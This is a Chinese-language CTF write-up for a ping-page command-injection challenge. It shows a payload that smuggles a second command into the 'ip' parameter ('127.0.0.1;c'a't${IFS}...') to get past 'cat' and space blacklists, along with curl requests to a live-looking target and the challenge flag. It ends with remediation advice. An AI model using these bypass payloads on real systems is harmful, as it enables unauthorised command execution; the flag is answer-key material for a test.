# 21-cmdi-ping-concat

## 题目信息

- 题目名：`21-cmdi-ping-concat`
- 参数：`ip`
- Flag：`TOGOGO-flag{2cb78d42-6386-461a-8b26-1070cc647e15}`
  ;c'a't${IFS}s3cr3t_out.txt

---

## 一句话思路

页面是一个 ping 功能，后端大概率把用户输入拼接进系统命令里执行。

我们在 `ip` 参数后面用 `;` 拼接第二条命令，再读取当前目录下的 `s3cr3t_out.txt` 文件。

---

## 漏洞原理

假设后端代码类似：

```php
system("ping -c 4 " . $_GET['ip']);
```

正常请求：

```text
?ip=127.0.0.1
```

后端执行：

```bash
ping -c 4 127.0.0.1
```

如果传入：

```bash
127.0.0.1;id
```

后端就可能执行：

```bash
ping -c 4 127.0.0.1;id
```

其中 `;` 在 shell 中表示分隔两条命令。

---

## 关键 Payload

原始 payload：

```bash
127.0.0.1;c'a't${IFS}s3cr3t_out.txt
```

等价于：

```bash
127.0.0.1;cat s3cr3t_out.txt
```

### 拆解说明

| 片段             | 作用                                               |
| ---------------- | -------------------------------------------------- |
| `127.0.0.1`      | 正常 ping 的 IP                                    |
| `;`              | 拼接新命令                                         |
| `c'a't`          | shell 解析后等于 `cat`，用于绕过 `cat` 黑名单      |
| `${IFS}`         | shell 内部分隔符，默认可当空格用，用于绕过空格过滤 |
| `s3cr3t_out.txt` | 要读取的文件                                       |

---

## 手工复刻 1：浏览器访问

把 payload URL 编码后访问：

```text
http://47.120.76.57:34294/?ip=127.0.0.1%3Bc%27a%27t%24%7BIFS%7Ds3cr3t_out.txt
```

如果成功，页面响应里会出现：

```text
TOGOGO-flag{2cb78d42-6386-461a-8b26-1070cc647e15}
```

---

## 手工复刻 2：curl

```bash
curl 'http://47.120.76.57:34294/?ip=127.0.0.1%3Bc%27a%27t%24%7BIFS%7Ds3cr3t_out.txt'
```

也可以让 curl 自动编码参数：

```bash
curl -G 'http://47.120.76.57:34294/' \
  --data-urlencode "ip=127.0.0.1;c'a't\${IFS}s3cr3t_out.txt"
```

注意：在本地 shell 里写 `${IFS}` 时，建议用单引号包住整个 URL，或者写成 `\${IFS}`，避免被本地 shell 提前展开。

---

## 自动化脚本

当前目录提供了 `main.py`：

```bash
python3 main.py
```

指定目标：

```bash
python3 main.py --url http://47.120.76.57:34294/
```

指定 payload：

```bash
python3 main.py --payload "127.0.0.1;c'a't\${IFS}s3cr3t_out.txt"
```

---

## 为什么不用直接 `cat flag`？

题目一般会过滤一些常见关键字，例如：

- 空格
- `/`
- `cat`
- `flag`

所以这里用了：

- `c'a't` 绕过 `cat`
- `${IFS}` 绕过空格
- `s3cr3t_out.txt` 避开 `flag` 字符串
- 相对路径文件名，避免使用 `/`

---

## 修复建议

真实业务中应避免把用户输入直接拼接到 shell 命令中。

建议：

1. 不调用 shell，使用语言原生 ping 库或安全 API。
2. 如果必须调用命令，使用参数数组方式，不经过 shell 拼接。
3. 对 IP 参数做严格白名单校验，只允许合法 IPv4 / IPv6。
4. 禁止使用黑名单过滤作为唯一防护。

Python 安全示例：

```python
import ipaddress
import subprocess

ip = input_ip
ipaddress.ip_address(ip)
subprocess.run(["ping", "-c", "4", ip], shell=False)
```
